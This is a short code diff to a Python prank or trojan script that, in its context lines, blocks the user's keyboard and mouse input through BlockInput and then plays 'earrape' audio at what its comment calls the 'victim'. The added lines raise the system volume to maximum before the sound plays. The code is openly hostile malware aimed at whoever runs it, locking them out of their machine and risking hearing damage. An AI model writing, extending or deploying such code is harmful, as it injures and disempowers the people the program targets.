@@ -24,6 +24,7 @@ from tkinter import messagebox
 # Variables
 timer = 0
 thread_times = 696969
+volume = 0
 
 def resource_path(relative_path):
     try:
@@ -109,6 +110,10 @@ sleep(5)
 input_lock = windll.user32.BlockInput(True)
 
 # Play earrape music in victims ears LMAO
+while volume <= 100:
+    pyautogui.press("volumeup")
+    volume = volume + 1
+
 pygame.mixer.init()
 pygame.mixer.music.load(deez_mp3)
 pygame.mixer.music.play(5)
